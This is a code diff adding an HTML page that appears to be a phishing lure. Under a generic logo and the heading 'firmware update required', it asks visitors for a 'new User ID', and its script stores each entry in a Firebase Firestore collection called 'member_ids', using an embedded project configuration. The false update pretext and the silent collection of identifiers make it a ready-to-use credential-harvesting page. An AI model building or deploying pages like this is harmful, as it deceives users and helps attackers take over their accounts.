@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Member ID Submission</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column; 
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #211497; 
+            margin: 0;
+        }
+        .logo {
+            max-width: 150px; 
+            margin-bottom: 20px; 
+        }
+        .form-container {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3); 
+            text-align: center;
+            width: 100%;
+            max-width: 300px;
+        }
+        h2 {
+            margin-bottom: 5px;
+            color: #333;
+        }
+        .sub-heading {
+            font-size: 13px;
+            font-weight: normal;
+            color: #666;
+            margin-top: 0;
+            margin-bottom: 20px;
+        }
+        input[type="text"] {
+            padding: 10px;
+            width: 90%;
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        button {
+            padding: 10px 20px;
+            background-color: #0056b3;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+        }
+        button:hover {
+            background-color: #004494;
+        }
+        #statusMessage {
+            margin-top: 15px;
+            font-size: 14px;
+            font-weight: bold;
+        }
+        .success { color: green; }
+        .error { color: red; }
+    </style>
+</head>
+<body>
+
+    <img src="logo.png" alt="Company Logo" class="logo">
+
+    <div class="form-container">
+        <h2>firmware update required</h2>
+        <p class="sub-heading">please enter your new User ID to continue.</p>
+        
+        <form id="idForm">
+            <input type="text" id="userid" placeholder="User ID" required>
+            <button type="submit" id="submitBtn">Submit ID</button>
+        </form>
+
+        <div id="statusMessage"></div>
+    </div>
+
+    <script type="module">
+        // Import necessary Firebase modules from Google's CDN
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
+        import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-analytics.js";
+        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-firestore.js";
+
+        // Your specific Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyC99fgDRbupEF67kdEC3bvJPtrksGv1cAk",
+            authDomain: "ab-area-4806b.firebaseapp.com",
+            projectId: "ab-area-4806b",
+            storageBucket: "ab-area-4806b.firebasestorage.app",
+            messagingSenderId: "763296464181",
+            appId: "1:763296464181:web:4a4f9e0915d9113681e07c",
+            measurementId: "G-9T7TRN07HR"
+        };
+
+        // Initialize Firebase Apps
+        const app = initializeApp(firebaseConfig);
+        const analytics = getAnalytics(app);
+        const db = getFirestore(app);
+
+        // Form Submission Logic
+        const form = document.getElementById('idForm');
+        const statusMessage = document.getElementById('statusMessage');
+        const submitBtn = document.getElementById('submitBtn');
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault(); 
+            
+            const userIdValue = document.getElementById('userid').value;
+            submitBtn.innerText = "Submitting...";
+            submitBtn.disabled = true;
+
+            try {
+                await addDoc(collection(db, "member_ids"), {
+                    userid: userIdValue,
+                    timestamp: new Date() 
+                });
+
+                statusMessage.innerText = "ID Submitted Successfully!";
+                statusMessage.className = "success";
+                form.reset(); 
+
+            } catch (error) {
+                console.error("Error adding document: ", error);
+                statusMessage.innerText = "Error submitting ID. Please try again.";
+                statusMessage.className = "error";
+            } finally {
+                submitBtn.innerText = "Submit ID";
+                submitBtn.disabled = false;
+            }
+        });
+    </script>
+</body>
+</html>
